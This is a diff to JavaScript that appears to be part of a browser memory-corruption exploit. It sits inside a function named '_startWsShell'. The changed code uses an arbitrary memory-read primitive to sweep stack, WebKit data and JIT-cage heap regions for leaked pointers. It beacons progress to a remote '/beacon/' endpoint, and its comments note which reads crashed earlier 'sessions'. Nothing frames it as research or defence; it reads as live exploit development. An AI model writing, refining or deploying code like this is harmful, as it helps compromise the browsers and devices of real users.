@@ -5841,11 +5841,14 @@ function _startWsShell(){
         function LF(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LC-'+s),false);x.send();}catch(e){}}
         try{
           var cfrL=S.cfr;
-          var seen={},ptrs=[];
+          var seen={},ptrs=[],bandN=0;
           function band(start,len,tag){
+            bandN++;
+            LF('b'+bandN+' '+tag+' start=0x'+start.toString(16)+' len=0x'+len.toString(16));
+            var got=0;
             for(var off=0;off<len;off+=0x2000){
               var ws;
-              try{ws=S.absRead(start+BigInt(off),Math.min(0x2000,len-off));}catch(e){break;}
+              try{ws=S.absRead(start+BigInt(off),Math.min(0x2000,len-off));}catch(e){LF('b'+bandN+' '+tag+' THROW@+0x'+off.toString(16));break;}
               shMarkOk(start+BigInt(off));
               for(var wi=0;wi<ws.length;wi++){
                 var v=ws[wi];
@@ -5854,17 +5857,29 @@ function _startWsShell(){
                 if(seen[key])continue;
                 var bad=false;
                 if(S.BASE&&(v>=S.BASE&&v<S.BASE+0x8000000n))bad=true;
-                if(v>=0x10000000000n)bad=true;
+                if(v>=0x800000000n&&v<0x880000000n)bad=true;   /* lk band (all observed lk bases) - not foreign */
                 if(S.lowB&&S.jfuTop&&v>=S.lowB&&v<S.jfuTop)bad=true;
                 if(cfrL&&(v>cfrL-0x100000n&&v<cfrL+0x100000n))bad=true;
                 if(v>=0x10001c0000n&&v<0x1000210000n)bad=true;
-                if(!bad){seen[key]=1;ptrs.push({v:'0x'+v.toString(16),band:tag});}
+                if(!bad){seen[key]=1;got++;ptrs.push({v:'0x'+v.toString(16),band:tag});}
               }
             }
+            LF('b'+bandN+' '+tag+' done n='+got);
           }
-          if(cfrL)band(cfrL-0x8000n,0xA000,'stk');
+          /* THE PROVEN BANDS ONLY (the scan-gate list - anything else has killed sessions):
+           *   stk: [cfr & ~0x3FFF, +0x8000) - ABOVE cfr (the caller chain:
+           *        the JS->native frames + the trampoline return slot. The
+           *        BELOW-cfr read (cfr-0x8000) KILLED session 148 - the
+           *        first chunk below the mapped stack = SIGSEGV).
+           *   wk:  [BASE+0x7000000, +0x400000) - WK data (gate-proven).
+           *   cage:[lowB, min(lowB+0x100000, jfuTop)) - the cage heap. */
+          if(cfrL)band((cfrL/0x4000n)*0x4000n,0x8000,'stk');
           if(S.BASE)band(S.BASE+0x7000000n,0x400000,'wk');
-          if(S.lowB)band(S.lowB,0x100000,'cage');
+          if(S.lowB){
+            var cageEnd=S.lowB+0x100000n;
+            if(S.jfuTop&&S.jfuTop<cageEnd)cageEnd=S.jfuTop;
+            band(S.lowB,Number(cageEnd-S.lowB),'cage');
+          }
           LF('1 harvest n='+ptrs.length);
           reply.ptrs=ptrs.slice(0,300);
           reply.n=ptrs.length;
